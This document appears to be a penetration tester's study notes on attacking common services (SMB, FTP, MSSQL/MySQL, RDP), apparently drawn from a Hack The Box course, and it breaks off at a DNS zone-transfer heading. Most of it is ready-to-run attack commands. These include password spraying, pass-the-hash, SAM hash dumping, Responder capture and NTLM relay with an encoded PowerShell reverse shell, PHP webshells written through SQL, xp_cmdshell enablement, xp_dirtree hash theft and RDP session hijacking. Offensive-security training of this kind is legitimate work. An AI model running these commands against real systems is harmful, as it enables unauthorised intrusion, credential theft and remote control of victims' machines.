
## 1.Interacting with Common Services

## Server Message Block (SMB)

**Windows**

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2F82hYbQxsOE5dVmmyTdq1%2Fimage.png?alt=media&amp;token=c00bc2d0-1278-409c-84db-7c8b320655e0" alt=""><figcaption></figcaption></figure>

file share using Command Shell (`CMD`) and `PowerShell`.&#x20;

**Windows CMD - DIR**

```cmd-session
C:\htb> dir \\192.168.220.129\Finance\
```

**Windows CMD - Net Use**

```cmd-session
C:\htb> net use n: \\192.168.220.129\Finance
```

We can also provide a username and password to authenticate to the share.

```cmd-session
C:\htb> net use n: \\192.168.220.129\Finance /user:plaintext Password123
```

**Windows CMD - DIR**

```cmd-session
C:\htb> dir n: /a-d /s /b | find /c ":\"
dir n: /a-d /s /b | find /c ":\"
```

With `dir` we can search for specific names in files such as:

* cred
* password
* users
* secrets
* key
* Common File Extensions for source code such as: .cs, .c, .go, .java, .php, .asp, .aspx, .html.

```cmd-session
C:\htb>dir n:\*cred* /s /b
C:\htb>dir n:\*secret* /s /b
```

**Windows CMD - Findstr**

```cmd-session
c:\htb>findstr /s /i cred n:\*.*
```

### Windows PowerShell

```powershell-session
PS C:\htb> Get-ChildItem \\192.168.220.129\Finance\
```

Instead of `net use`, we can use `New-PSDrive` in PowerShell.

```powershell-session
PS C:\htb> New-PSDrive -Name "N" -Root "\\192.168.220.129\Finance" -PSProvider "FileSystem"
```

**Windows PowerShell - PSCredential Object**

```powershell-session
PS C:\htb> $username = 'plaintext'
PS C:\htb> $password = 'Password123'
PS C:\htb> $secpassword = ConvertTo-SecureString $password -AsPlainText -Force
PS C:\htb> $cred = New-Object System.Management.Automation.PSCredential $username, $secpassword
PS C:\htb> New-PSDrive -Name "N" -Root "\\192.168.220.129\Finance" -PSProvider "FileSystem" -Credential $cred
```

**Windows PowerShell - GCI**

```powershell-session
PS C:\htb> N:
PS N:\> (Get-ChildItem -File -Recurse | Measure-Object).Count
```

```powershell-session
PS C:\htb> Get-ChildItem -Recurse -Path N:\ -Include *cred* -File
```

**Windows PowerShell - Select-String**

```powershell-session
PS C:\htb> Get-ChildItem -Recurse -Path N:\ | Select-String "cred" -List
```

## **Linux - Mount**

```shell-session
Olanzapine@htb[/htb]$ sudo mkdir /mnt/Finance
Olanzapine@htb[/htb]$ sudo mount -t cifs -o username=plaintext,password=Password123,domain=. //192.168.220.129/Finance /mnt/Finance
```

As an alternative, we can use a credential file.

```shell-session
 mount -t cifs //192.168.220.129/Finance /mnt/Finance -o credentials=/path/credentialfile
```

> Note: We need to install `cifs-utils` to connect to an SMB share folder. To install it we can execute from the command line `sudo apt install cifs-utils`.

### **Linux - Find**

```shell-session
find /mnt/Finance/ -name *cred*
grep -rn /mnt/Finance/ -ie cred
```

## Other Services

We can use a mail client such as [Evolution](https://wiki.gnome.org/Apps/Evolution), the official personal information manager, and mail client for the GNOME Desktop Environment. We can interact with an email server to send or receive messages with a mail client.

### Linux - Install Evolution

```shell-session
sudo apt-get install evolution
```

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FUcPisJcboQfBfR7J67PH%2Fimage.png?alt=media&amp;token=5625843e-d9e9-48cb-a2de-18e430f42309" alt=""><figcaption></figcaption></figure>

## **Databases**

Command Line Utilities (`mysql` or `sqsh`)

### MSSQL

**Linux - SQSH**

```shell-session
sqsh -S 10.129.20.13 -U username -P Password123
```

**Windows - SQLCMD**

```cmd-session
sqlcmd -S 10.129.20.13 -U username -P Password123
```

### **MySQL**

**Linux - MySQL**

```shell-session
mysql -u username -pPassword123 -h 10.129.20.13
```

**Windows - MySQL**

```cmd-session
mysql.exe -u username -pPassword123 -h 10.129.20.13
```

## **GUI Application Mysql**

```shell-session
sudo dpkg -i dbeaver-<version>.deb
dbeaver &
```

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FvEARuEvELmawTfpNtU5M%2Fimage.png?alt=media&amp;token=c8daa5fa-fa14-4584-b83f-80ee832ab816" alt=""><figcaption></figcaption></figure>

## Tools to Interact with Common Services

| **SMB**                                                                                  | **FTP**                                     | **Email**                                          | **Databases**                                                                                                                |
| ---------------------------------------------------------------------------------------- | ------------------------------------------- | -------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------- |
| [smbclient](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html)          | [ftp](https://linux.die.net/man/1/ftp)      | [Thunderbird](https://www.thunderbird.net/en-US/)  | [mssql-cli](https://github.com/dbcli/mssql-cli)                                                                              |
| [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)                              | [lftp](https://lftp.yar.ru/)                | [Claws](https://www.claws-mail.org/)               | [mycli](https://github.com/dbcli/mycli)                                                                                      |
| [SMBMap](https://github.com/ShawnDEvans/smbmap)                                          | [ncftp](https://www.ncftp.com/)             | [Geary](https://wiki.gnome.org/Apps/Geary)         | [mssqlclient.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py)                             |
| [Impacket](https://github.com/SecureAuthCorp/impacket)                                   | [filezilla](https://filezilla-project.org/) | [MailSpring](https://getmailspring.com/)           | [dbeaver](https://github.com/dbeaver/dbeaver)                                                                                |
| [psexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py)   | [crossftp](http://www.crossftp.com/)        | [mutt](http://www.mutt.org/)                       | [MySQL Workbench](https://dev.mysql.com/downloads/workbench/)                                                                |
| [smbexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py) |                                             | [mailutils](https://mailutils.org/)                | [SQL Server Management Studio or SSMS](https://docs.microsoft.com/en-us/sql/ssms/download-sql-server-management-studio-ssms) |
|                                                                                          |                                             | [sendEmail](https://github.com/mogaal/sendemail)   |                                                                                                                              |
|                                                                                          |                                             | [swaks](http://www.jetmore.org/john/code/swaks/)   |                                                                                                                              |
|                                                                                          |                                             | [sendmail](https://en.wikipedia.org/wiki/Sendmail) |                                                                                                                              |

## 2.Attacking FTP

### Enumeration

```shell-session
 sudo nmap -sC -sV -p 21 192.168.2.142
```

### **Anonymous Authentication**

```shell-session
ftp 192.168.2.142
anonymous:anonymous
```

### Brute Forcing with Medusa

* <https://github.com/jmk-foofus/medusa>

```shell-session
medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp
```

### FTP Bounch Attack

```shell-session
nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2
```

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2F1HZ3citm8crFr0Hlpbt1%2Fimage.png?alt=media&amp;token=91719dbe-f902-49e4-80cf-ce303384ba28" alt=""><figcaption></figcaption></figure>

## Latest FTP Vulnerabilities

```shell-session
Olanzapine@htb[/htb]$ curl -k -X PUT -H "Host: <IP>" --basic -u <username>:<password> --data-binary "PoC." --path-as-is https://<IP>/../../../../../../whoops
```

```cmd-session
C:\> type C:\whoops

PoC.
```

## 2.Attacking SMB

### Enumeration

```shell-session
sudo nmap 10.129.14.128 -sV -sC -p139,445
```

## Misconfigurations

### **Anonymous Authentication**

If we find an SMB server that does not require a username and password or find valid credentials, we can get a list of shares, usernames, groups, permissions, policies, services, etc. Most tools that interact with SMB allow null session connectivity, including `smbclient`, `smbmap`, `rpcclient`, or `enum4linux`. Let's explore how we can interact with file shares and RPC using null authentication.

### File Share

### Smbclient

```shell-session
 smbclient -N -L //10.129.14.128
```

### Smbmap

```shell-session
smbmap -H 10.129.14.128
smbmap -H 10.129.14.128 -r notes
```

* From the above example, the permissions are set to `READ` and `WRITE`, which one can use to upload and download the files.

```shell-session
smbmap -H 10.129.14.128 --download "notes\note.txt"
smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"
```

### Remote Procedure Call (RPC)

```shell-session
rpcclient -U'%' 10.10.110.17

rpcclient $> enumdomusers
```

### Enum4linux

`Enum4linux` is another utility that supports null sessions, and it utilizes `nmblookup`, `net`, `rpcclient`, and `smbclient` to automate some common enumeration from SMB targets such as:

* Workgroup/Domain name
* Users information
* Operating system information
* Groups information
* Shares Folders
* Password policy information

```shell-session
./enum4linux-ng.py 10.10.11.45 -A -C
```

If a null session is not enabled, we will need credentials to interact with the SMB protocol. Two common ways to obtain credentials are [brute forcing](https://en.wikipedia.org/wiki/Brute-force_attack) and [password spraying](https://owasp.org/www-community/attacks/Password_Spraying_Attack).

### Brute Forcing and Password Spray

```shell-session
cat /tmp/userlist.txt

Administrator
jrodriguez 
admin
<SNIP>
jurena
```

```shell-session
crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth
```

**SMB**

Linux and Windows SMB servers provide different attack paths. Usually, we will only get access to the file system, abuse privileges, or exploit known vulnerabilities in a Linux environment, as we will discuss later in this section. However, in Windows, the attack surface is more significant.

When attacking a Windows SMB Server, our actions will be limited by the privileges we had on the user we manage to compromise. If this user is an Administrator or has specific privileges, we will be able to perform operations such as:

* Remote Command Execution
* Extract Hashes from SAM Database
* Enumerating Logged-on Users
* Pass-the-Hash (PTH)

We can download PsExec from [Microsoft website](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec), or we can use some Linux implementations:

* [Impacket PsExec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py) - Python PsExec like functionality example using [RemComSvc](https://github.com/kavika13/RemCom).
* [Impacket SMBExec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py) - A similar approach to PsExec without using [RemComSvc](https://github.com/kavika13/RemCom). The technique is described [here](https://web.archive.org/web/20190515131124/https://www.optiv.com/blog/owning-computers-without-shell-access). This implementation goes one step further, instantiating a local SMB server to receive the output of the commands. This is useful when the target machine does NOT have a writeable share available.
* [Impacket atexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py) - This example executes a command on the target machine through the Task Scheduler service and returns the output of the executed command.
* [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) - includes an implementation of `smbexec` and `atexec`.
* [Metasploit PsExec](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/windows/smb/psexec.md) - Ruby PsExec implementation.

### **Impacket PsExec**

```shell-session
impacket-psexec -h
```

To connect to a remote machine with a local administrator account

```shell-session
impacket-psexec administrator:'Password123!'@10.10.110.17
```

The same options apply to `impacket-smbexec` and `impacket-atexec`.

## **CrackMapExec**

```shell-session
crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec
```

### **Enumerating Logged-on Users**

```shell-session
crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users
```

### Extract Hashes from SAM Database

```shell-session
crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam
```

### **Pass-the-Hash (PtH)**

```shell-session
crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE
```

## Forced Authentication Attacks

```shell-session
responder -I <interface name>
sudo responder -I ens33
```

* These captured credentials can be cracked using [hashcat](https://hashcat.net/hashcat/) or relayed to a remote host to complete the authentication and impersonate the user.
* All saved Hashes are located in Responder's logs directory (`/usr/share/responder/logs/`). We can copy the hash to a file and attempt to crack it using the hashcat module 5600.

> Note: If you notice multiples hashes for one account this is because NTLMv2 utilizes both a client-side and server-side challenge that is randomized for each interaction. This makes it so the resulting hashes that are sent are salted with a randomized string of numbers. This is why the hashes don't match but still represent the same password.

```shell-session
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

If we cannot crack the hash, we can potentially relay the captured hash to another machine using [impacket-ntlmrelayx](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py) or Responder [MultiRelay.py](https://github.com/lgandx/Responder/blob/master/tools/MultiRelay.py). Let us see an example using `impacket-ntlmrelayx`.

First, we need to set SMB to `OFF` in our responder configuration file (`/etc/responder/Responder.conf`).

```shell-session
cat /etc/responder/Responder.conf | grep 'SMB ='

SMB = Off
```

### &#x20;`impacket-ntlmrelayx`&#x20;

`impacket-ntlmrelayx` will dump the SAM database

but we can execute commands by adding the option `-c`.

```shell-session
 impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146
```

We can create a PowerShell reverse shell using <https://www.revshells.com/>, set our machine IP address, port, and the option Powershell #3 (Base64).

```shell-session
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADIAMgAwAC4AMQAzADMAIgAsADkAMAAwADEAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA'
```

```shell-session
nc -lvnp 9001
```

* <https://www.willhackforsushi.com/sec504/SMB-Access-from-Linux.pdf>

## Latest SMB Vulnerabilities

{% embed url="<https://academy.hackthebox.com/module/116/section/1168>" %}

{% embed url="<https://www.exploit-db.com/exploits/48537>" %}

***

## 3.SQL Databases

### **Banner Grabbing**

```shell-session
 nmap -Pn -sV -sC -p1433 10.10.10.125
```

### Authentication Mechanisms

| **Authentication Type**       | **Description**                                                                                                                                                                                                                                                                                                                           |
| ----------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `Windows authentication mode` | This is the default, often referred to as `integrated` security because the SQL Server security model is tightly integrated with Windows/Active Directory. Specific Windows user and group accounts are trusted to log in to SQL Server. Windows users who have already been authenticated do not have to present additional credentials. |
| `Mixed mode`                  | Mixed mode supports authentication by Windows/Active Directory accounts and SQL Server. Username and password pairs are maintained within SQL Server.                                                                                                                                                                                     |

### Misconfigurations

Misconfigured authentication in SQL Server can let us access the service without credentials if anonymous access is enabled, a user without a password is configured, or any user, group, or machine is allowed to access the SQL Server.

### **Privileges**

Depending on the user's privileges, we may be able to perform different actions within a SQL Server, such as:

* Read or change the contents of a database
* Read or change the server configuration
* Execute commands
* Read local files
* Communicate with other databases
* Capture the local system hash
* Impersonate existing users
* Gain access to other networks

## Read/Change the Database

```shell-session
mysql -u julio -pPassword123 -h 10.129.20.13
```

**Sqlcmd - Connecting to the SQL Server**

```cmd-session
C:\htb> sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30
```

If we are targetting `MSSQL` from Linux, we can use `sqsh` as an alternative to `sqlcmd`:<br>

### sqsh

```shell-session
sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h
```

Alternatively, we can use the tool from Impacket with the name `mssqlclient.py`.

### mssqlclient.py

```shell-session
mssqlclient.py -p 1433 julio@10.129.203.7 
```

When using Windows Authentication, we need to specify the domain name or the hostname of the target machine. If we don't specify a domain or hostname, it will assume SQL Authentication and authenticate against the users created in the SQL Server.

```shell-session
 sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h
```

### SQL Default Databases

`MySQL` default system schemas/databases:

* `mysql` - is the system database that contains tables that store information required by the MySQL server
* `information_schema` - provides access to database metadata
* `performance_schema` - is a feature for monitoring MySQL Server execution at a low level
* `sys` - a set of objects that helps DBAs and developers interpret data collected by the Performance Schema

`MSSQL` default system schemas/databases:

* `master` - keeps the information for an instance of SQL Server.
* `msdb` - used by SQL Server Agent.
* `model` - a template database copied for each new database.
* `resource` - a read-only database that keeps system objects visible in every database on the server in sys schema.
* `tempdb` - keeps temporary objects for SQL queries.

### SQL Syntax

```shell-session
mysql> SHOW DATABASES;
```

### SQLCMD

If we use `sqlcmd`, we will need to use `GO` after our query to execute the SQL syntax.

```cmd-session
1> SELECT name FROM master.dbo.sysdatabases
2> GO
```

**Select a Database**

```shell-session
mysql> USE htbusers;
```

**SQLCMD - Select a Database**

```cmd-session
1> USE htbusers
2> GO
```

**Show Tables**

```shell-session
mysql> SHOW TABLES;
```

**SQLCMD - Show tables**

```cmd-session
1> SELECT table_name FROM htbusers.INFORMATION_SCHEMA.TABLES
2> GO
```

**Select all Data from Table "users"**

```shell-session
mysql> SELECT * FROM users;
```

**sqlcmd - Select all Data from Table "users"**

```cmd-session
1> SELECT * FROM users
2> go
```

## Execute Commands

### **XP\_CMDSHELL**

```cmd-session
1> xp_cmdshell 'whoami'
2> GO
```

If `xp_cmdshell` is not enabled, we can enable it, if we have the appropriate privileges, using the following command:

### XP\_CMD\_Enabled

```mssql
-- To allow advanced options to be changed.  
EXECUTE sp_configure 'show advanced options', 1
GO

-- To update the currently configured value for advanced options.  
RECONFIGURE
GO  

-- To enable the feature.  
EXECUTE sp_configure 'xp_cmdshell', 1
GO  

-- To update the currently configured value for this feature.  
RECONFIGURE
GO
```

## Write Local Files

### MySQL - Write Local File<br>

```shell-session
mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
```

> In `MySQL`, a global system variable [secure\_file\_priv](https://dev.mysql.com/doc/refman/5.7/en/server-system-variables.html#sysvar_secure_file_priv) limits the effect of data import and export operations, such as those performed by the `LOAD DATA` and `SELECT … INTO OUTFILE` statements and the [LOAD\_FILE()](https://dev.mysql.com/doc/refman/5.7/en/string-functions.html#function_load-file) function. These operations are permitted only to users who have the [FILE](https://dev.mysql.com/doc/refman/5.7/en/privileges-provided.html#priv_file) privilege.
>
> `secure_file_priv` may be set as follows:
>
> * If empty, the variable has no effect, which is not a secure setting.
> * If set to the name of a directory, the server limits import and export operations to work only with files in that directory. The directory must exist; the server does not create it.
> * If set to NULL, the server disables import and export operations.
>
> In the following example, we can see the `secure_file_priv` variable is empty, which means we can read and write data using `MySQL`:

**MySQL - Secure File Privileges**

```shell-session
mysql> show variables like "secure_file_priv";
```

### MSSQL

To write files using `MSSQL`, we need to enable [Ole Automation Procedures](https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/ole-automation-procedures-server-configuration-option), which requires admin privileges, and then execute some stored procedures to create the file:<br>

### MSSQL - Enable Ole Automation Procedures

```cmd-session
1> sp_configure 'show advanced options', 1
2> GO
3> RECONFIGURE
4> GO
5> sp_configure 'Ole Automation Procedures', 1
6> GO
7> RECONFIGURE
8> GO
```

### MSSQL - Create a File

```cmd-session
1> DECLARE @OLE INT
2> DECLARE @FileID INT
3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
6> EXECUTE sp_OADestroy @FileID
7> EXECUTE sp_OADestroy @OLE
8> GO
```

## Read Local Files

### Read Local Files in MSSQL

```cmd-session
1> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
2> GO
```

### MySQL - Read Local Files in MySQL

```shell-session
mysql> select LOAD_FILE("/etc/passwd");
```

## Capture MSSQL Service Hash

To make this work, we need first to start [Responder](https://github.com/lgandx/Responder) or [impacket-smbserver](https://github.com/SecureAuthCorp/impacket) and execute one of the following SQL queries:

### XP\_DIRTREE Hash Stealing

```cmd-session
1> EXEC master..xp_dirtree '\\10.10.110.17\share\'
2> GO
```

### XP\_SUBDIRS Hash Stealing

```cmd-session
1> EXEC master..xp_subdirs '\\10.10.110.17\share\'
2> GO
```

### XP\_SUBDIRS Hash Stealing with Responder

```shell-session
sudo responder -I tun0
```

### XP\_SUBDIRS Hash Stealing with impacket

```shell-session
sudo impacket-smbserver share ./ -smb2support
```

## Impersonate Existing Users with MSSQL

### **Identify Users that We Can Impersonate**

```cmd-session
1> SELECT distinct b.name
2> FROM sys.server_permissions a
3> INNER JOIN sys.server_principals b
4> ON a.grantor_principal_id = b.principal_id
5> WHERE a.permission_name = 'IMPERSONATE'
6> GO




name
-----------------------------------------------
sa
ben
valentin
```

### Verifying our Current User and Role

```cmd-session
1> SELECT SYSTEM_USER
2> SELECT IS_SRVROLEMEMBER('sysadmin')
3> go
```

As the returned value `0` indicates, we do not have the sysadmin role, but we can impersonate the `sa` user.&#x20;

### Impersonating the SA User

```cmd-session
1> EXECUTE AS LOGIN = 'sa'
2> SELECT SYSTEM_USER
3> SELECT IS_SRVROLEMEMBER('sysadmin')
4> GO

-----------
sa
```

> Note: It's recommended to run `EXECUTE AS LOGIN` within the master DB, because all users, by default, have access to that database. If a user you are trying to impersonate doesn't have access to the DB you are connecting to it will present an error. Try to move to the master DB using `USE master`.

We can now execute any command as a sysadmin as the returned value `1` indicates. To revert the operation and return to our previous user, we can use the Transact-SQL statement `REVERT`.

## Communicate with Other Databases with MSSQL

### Identify linked Servers in MSSQL

```cmd-session
1> SELECT srvname, isremote FROM sysservers
2> GO
```

As we can see in the query's output, we have the name of the server and the column `isremote`, where `1` means is a remote server, and `0` is a linked server. We can see [sysservers Transact-SQL](https://docs.microsoft.com/en-us/sql/relational-databases/system-compatibility-views/sys-sysservers-transact-sql) for more information.

Next, we can attempt to identify the user used for the connection and its privileges. The [EXECUTE](https://docs.microsoft.com/en-us/sql/t-sql/language-elements/execute-transact-sql) statement can be used to send pass-through commands to linked servers. We add our command between parenthesis and specify the linked server between square brackets (`[ ]`).

```cmd-session
1> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
2> GO
```

***

## Latest SQL Vulnerabilities

### **Initiation of the Attack**

| **Step** | **XP\_DIRTREE**                                                                                                                 | **Concept of Attacks - Category** |
| -------- | ------------------------------------------------------------------------------------------------------------------------------- | --------------------------------- |
| `1.`     | The source here is the user input, which specifies the function and the folder shared in the network.                           | `Source`                          |
| `2.`     | The process should ensure that all contents of the specified folder are displayed to the user.                                  | `Process`                         |
| `3.`     | The execution of system commands on the MSSQL server requires elevated privileges with which the service executes the commands. | `Privileges`                      |
| `4.`     | The SMB service is used as the destination to which the specified information is forwarded.                                     | `Destination`                     |

This is when the cycle starts all over again, but this time to obtain the NTLMv2 hash of the MSSQL service user.

### **Steal The Hash**

| **Step** | **Stealing the Hash**                                                                                                       | **Concept of Attacks - Category** |
| -------- | --------------------------------------------------------------------------------------------------------------------------- | --------------------------------- |
| `5.`     | Here, the SMB service receives the information about the specified order through the previous process of the MSSQL service. | `Source`                          |
| `6.`     | The data is then processed, and the specified folder is queried for the contents.                                           | `Process`                         |
| `7.`     | The associated authentication hash is used accordingly since the MSSQL running user queries the service.                    | `Privileges`                      |
| `8.`     | In this case, the destination for the authentication and query is the host we control and the shared folder on the network. | `Destination`                     |

Finally, the hash is intercepted by tools like `Responder`, `WireShark`, or `TCPDump` and displayed to us, which we can try to use for our purposes. Apart from that, there are many different ways to execute commands in MSSQL.

## 4.Attacking RDP

```shell-session
nmap -Pn -p3389 192.168.2.143 
```

### password guessing

* <https://github.com/galkan/crowbar>

```shell-session
cat usernames.txt 

root
test
user
guest
admin
administrator
```

### **Crowbar - RDP Password Spraying**

```shell-session
crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'
```

We can also use `Hydra` to perform an RDP password spray attack.

### Hydra - RDP Password Spraying

```shell-session
hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp
```

* We can RDP into the target system using the `rdesktop` client or `xfreerdp` client with valid credentials.

### RDP Login

```shell-session
rdesktop -u admin -p password123 192.168.2.143
```

### RDP Session Hijacking

we are logged in as the user `juurena` (UserID = 2) who has `Administrator` privileges. Our goal is to hijack the user `lewen` (User ID = 4), who is also logged in via RDP.

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FWCKzmUVHn42vBmk78et0%2Fimage.png?alt=media&amp;token=92ad52a2-8e3a-4ac3-8909-723872b662f5" alt=""><figcaption></figcaption></figure>

To successfully impersonate a user without their password, we need to have `SYSTEM` privileges and use the Microsoft [tscon.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/tscon) binary that enables users to connect to another desktop session.&#x20;

```cmd-session
C:\htb> tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}
```

> If we have local administrator privileges, we can use several methods to obtain `SYSTEM` privileges, such as [PsExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec) or [Mimikatz](https://github.com/gentilkiwi/mimikatz). A simple trick is to create a Windows service that, by default, will run as `Local System` and will execute any binary with `SYSTEM` privileges. We will use [Microsoft sc.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/sc-create) binary. First, we specify the service name (`sessionhijack`) and the `binpath`, which is the command we want to execute. Once we run the following command, a service named `sessionhijack` will be created.

```cmd-session
C:\htb> query user
C:\htb> sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"
```

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FAG1prfPd4vf1Y47Yup7b%2Fimage.png?alt=media&amp;token=5f6f34dd-f991-47c6-a91d-d07bdd8bfda7" alt=""><figcaption></figcaption></figure>

To run the command, we can start the `sessionhijack` service :

```cmd-session
C:\htb> net start sessionhijack
```

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2Fzi1mamCjQhfC0tRDBnXD%2Fimage.png?alt=media&amp;token=e035b1d5-a10e-4bee-a9d7-5b2765604173" alt=""><figcaption></figcaption></figure>

## RDP Pass-the-Hash (PtH)

* Restricted Admin Mode

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2Ff9P7OQ6elgZcsnR7rIJK%2Fimage.png?alt=media&amp;token=6a651012-1bba-4e94-b837-432b3a6fd0eb" alt=""><figcaption></figcaption></figure>

This can be enabled by adding a new registry key `DisableRestrictedAdmin` (REG\_DWORD) under `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa`. It can be done using the following command:

### Adding the DisableRestrictedAdmin Registry Key

```cmd-session
C:\htb> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FtBBGuTXWtORAtbG9F9i8%2Fimage.png?alt=media&amp;token=c6aeb866-d0c4-4e77-9f26-7e81528966d5" alt=""><figcaption></figcaption></figure>

```shell-session
xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9
```

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FVfrFO9XsU6PXV8NNgO4R%2Fimage.png?alt=media&amp;token=736cf8ea-6439-4447-8520-2c1c647c1e4f" alt=""><figcaption></figcaption></figure>

## 5.DNS

### Enumeration

```shell-session
nmap -p53 -Pn -sV -sC 10.10.110.213
```

### DNS Zone Transfer

```shell-session
